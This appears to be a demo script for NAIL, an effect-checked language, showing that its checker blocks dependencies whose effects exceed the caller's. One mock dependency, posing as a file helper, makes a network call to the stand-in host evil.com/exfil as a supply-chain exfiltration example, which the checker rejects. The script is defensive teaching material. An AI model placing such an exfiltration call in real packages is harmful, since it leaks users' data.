#!/usr/bin/env python3
"""
NAIL Cross-Module Trust Boundary Demo
=======================================
"Supply chain attack — a dependency tries to escalate its privileges."

Uses Checker(caller_spec, modules={"id": dep_spec}) to verify that
imported modules don't exceed the caller's declared effects.

Run: python demos/trust_boundary_demo.py
"""

import json, sys, textwrap
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from interpreter import Checker, CheckError
from interpreter.types import NailEffectError

INT_T = {"type": "int", "bits": 64, "overflow": "panic"}
STR_T = {"type": "string", "encoding": "utf8"}


def section(title: str):
    print(f"\n{'═' * 64}")
    print(f"  {title}")
    print(f"{'═' * 64}")


def check_nail(spec: dict, label: str, modules: dict | None = None) -> bool:
    raw = json.dumps(spec, sort_keys=True, separators=(",", ":"))
    try:
        Checker(spec, raw_text=raw, modules=modules).check()
        print(f"  ✅ NAIL checker: PASSED  ({label})")
        return True
    except (CheckError, NailEffectError) as e:
        print(f"  ❌ NAIL checker: BLOCKED ({label})")
        print(f"     → {e}")
        return False


# ── Dependency module definitions ──────────────────────────────────────

# Pure math utilities — no effects
dep_pure_math = {
    "nail": "0.8", "kind": "module", "id": "math_utils",
    "exports": ["add"],
    "defs": [
        {
            "nail": "0.8", "kind": "fn", "id": "add",
            "effects": [],
            "params": [{"id": "a", "type": INT_T}, {"id": "b", "type": INT_T}],
            "returns": INT_T,
            "body": [
                {"op": "return", "val": {"op": "+", "l": {"ref": "a"}, "r": {"ref": "b"}}},
            ],
        }
    ],
}

# Analytics module — declares IO (wants to log/print)
dep_io_analytics = {
    "nail": "0.8", "kind": "module", "id": "analytics",
    "exports": ["track"],
    "defs": [
        {
            "nail": "0.8", "kind": "fn", "id": "track",
            "effects": ["IO"],
            "params": [{"id": "event", "type": STR_T}],
            "returns": {"type": "unit"},
            "body": [
                {"op": "print", "val": {"ref": "event"}, "effect": "IO"},
                {"op": "return", "val": {"lit": None, "type": {"type": "unit"}}},
            ],
        }
    ],
}

# File helper that secretly uses NET (supply chain attack!)
dep_net_smuggler = {
    "nail": "0.8", "kind": "module", "id": "file_helper",
    "exports": ["read_and_send"],
    "defs": [
        {
            "nail": "0.8", "kind": "fn", "id": "read_and_send",
            "effects": ["NET"],         # declares NET — attacker's true intent
            "params": [{"id": "path", "type": STR_T}],
            "returns": STR_T,
            "body": [
                {"op": "http_get",
                 "url": {"lit": "https://evil.com/exfil"},
                 "effect": "NET", "into": "resp"},
                {"op": "return", "val": {"ref": "resp"}},
            ],
        }
    ],
}

# IO logger — declares IO
dep_io_logger = {
    "nail": "0.8", "kind": "module", "id": "logger",
    "exports": ["log"],
    "defs": [
        {
            "nail": "0.8", "kind": "fn", "id": "log",
            "effects": ["IO"],
            "params": [{"id": "msg", "type": STR_T}],
            "returns": {"type": "unit"},
            "body": [
                {"op": "print", "val": {"ref": "msg"}, "effect": "IO"},
                {"op": "return", "val": {"lit": None, "type": {"type": "unit"}}},
            ],
        }
    ],
}


# ══════════════════════════════════════════════════════════════════════
# Scenario 1 — Pure dep + pure caller → PASS
# ══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    section("Scenario 1: Pure math_utils + pure caller")

    print(textwrap.dedent("""\
      Dependency: math_utils (effects: [])  — pure arithmetic
      Caller:     my_app     (effects: [])  — also pure

      A pure module calling a pure dependency is always safe.
    """))

    caller_pure = {
        "nail": "0.8", "kind": "module", "id": "my_app",
        "imports": [{"module": "math_utils", "fns": ["add"]}],
        "exports": ["compute"],
        "defs": [
            {
                "nail": "0.8", "kind": "fn", "id": "compute",
                "effects": [],
                "params": [],
                "returns": INT_T,
                "body": [
                    {"op": "let", "id": "result", "type": INT_T,
                     "val": {"op": "call", "module": "math_utils", "fn": "add",
                             "args": [{"lit": 2}, {"lit": 3}]}},
                    {"op": "return", "val": {"ref": "result"}},
                ],
            }
        ],
    }
    check_nail(caller_pure, "pure dep + pure caller", modules={"math_utils": dep_pure_math})


    # ══════════════════════════════════════════════════════════════════════
    # Scenario 2 — IO dep + pure caller → BLOCKED
    # ══════════════════════════════════════════════════════════════════════
    section("Scenario 2: IO analytics + pure caller")

    print(textwrap.dedent("""\
      Dependency: analytics  (effects: [IO])  — wants to print
      Caller:     my_app     (effects: [])    — declared pure

      The analytics module uses IO, but the caller is pure.
      NAIL blocks: you can't sneak IO through a pure boundary.
    """))

    caller_pure_io_dep = {
        "nail": "0.8", "kind": "module", "id": "my_app",
        "imports": [{"module": "analytics", "fns": ["track"]}],
        "exports": ["run"],
        "defs": [
            {
                "nail": "0.8", "kind": "fn", "id": "run",
                "effects": [],          # pure!
                "params": [],
                "returns": {"type": "unit"},
                "body": [
                    {"op": "call", "module": "analytics", "fn": "track",
                     "args": [{"lit": "page_view"}]},
                    {"op": "return", "val": {"lit": None, "type": {"type": "unit"}}},
                ],
            }
        ],
    }
    check_nail(caller_pure_io_dep, "IO dep in pure caller",
               modules={"analytics": dep_io_analytics})


    # ══════════════════════════════════════════════════════════════════════
    # Scenario 3 — NET dep + FS-only caller → BLOCKED
    # ══════════════════════════════════════════════════════════════════════
    section("Scenario 3: NET file_helper + FS-only caller")

    print(textwrap.dedent("""\
      Dependency: file_helper   (effects: [NET])  — secretly uses network
      Caller:     my_app        (effects: [FS])   — only allowed filesystem

      Supply chain attack: the "file helper" actually calls the network.
      NAIL blocks: NET is not a subset of FS.
    """))

    caller_fs_only = {
        "nail": "0.8", "kind": "module", "id": "my_app",
        "imports": [{"module": "file_helper", "fns": ["read_and_send"]}],
        "exports": ["process"],
        "defs": [
            {
                "nail": "0.8", "kind": "fn", "id": "process",
                "effects": ["FS"],      # only FS!
                "params": [{"id": "path", "type": STR_T}],
                "returns": STR_T,
                "body": [
                    {"op": "let", "id": "data", "type": STR_T,
                     "val": {"op": "call", "module": "file_helper", "fn": "read_and_send",
                             "args": [{"ref": "path"}]}},
                    {"op": "return", "val": {"ref": "data"}},
                ],
            }
        ],
    }
    check_nail(caller_fs_only, "NET dep in FS-only caller",
               modules={"file_helper": dep_net_smuggler})


    # ══════════════════════════════════════════════════════════════════════
    # Scenario 4 — IO dep + IO caller → PASS
    # ══════════════════════════════════════════════════════════════════════
    section("Scenario 4: IO logger + IO caller")

    print(textwrap.dedent("""\
      Dependency: logger    (effects: [IO])  — prints log messages
      Caller:     my_app    (effects: [IO])  — also has IO access

      Both sides declare IO — the effect boundary is respected.
    """))

    caller_io = {
        "nail": "0.8", "kind": "module", "id": "my_app",
        "imports": [{"module": "logger", "fns": ["log"]}],
        "exports": ["greet"],
        "defs": [
            {
                "nail": "0.8", "kind": "fn", "id": "greet",
                "effects": ["IO"],
                "params": [],
                "returns": {"type": "unit"},
                "body": [
                    {"op": "call", "module": "logger", "fn": "log",
                     "args": [{"lit": "Hello from my_app!"}]},
                    {"op": "return", "val": {"lit": None, "type": {"type": "unit"}}},
                ],
            }
        ],
    }
    check_nail(caller_io, "IO dep + IO caller",
               modules={"logger": dep_io_logger})


    # ══════════════════════════════════════════════════════════════════════
    # Summary
    # ══════════════════════════════════════════════════════════════════════
    section("Summary")
    print(textwrap.dedent("""\
      NAIL's cross-module trust boundary enforcement:

      ┌──────────────────────────┬────────────┬────────────┬───────────┐
      │ Scenario                 │ Dep Effect │ Caller Eff │ Result    │
      ├──────────────────────────┼────────────┼────────────┼───────────┤
      │ pure math + pure caller  │ (none)     │ (none)     │ ✅ PASS   │
      │ IO analytics + pure      │ IO         │ (none)     │ ❌ BLOCKED│
      │ NET helper + FS caller   │ NET        │ FS         │ ❌ BLOCKED│
      │ IO logger + IO caller    │ IO         │ IO         │ ✅ PASS   │
      └──────────────────────────┴────────────┴────────────┴───────────┘

      "A dependency cannot escalate beyond what the caller declares."
    """))
